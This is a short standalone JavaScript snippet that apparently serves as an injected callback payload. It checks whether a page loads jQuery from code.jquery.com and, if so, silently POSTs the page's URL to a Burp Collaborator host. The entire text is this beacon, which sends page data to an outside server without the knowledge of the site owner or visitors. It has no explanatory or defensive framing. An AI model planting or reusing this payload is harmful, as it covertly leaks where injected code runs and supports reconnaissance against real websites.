var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://8mvcheojaohdf3432jmgzibkgbm1aq.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
headers:{'content-type': 'application/x-www-form-urlencoded'},
body:`domain=${document.documentURI}`
});
}
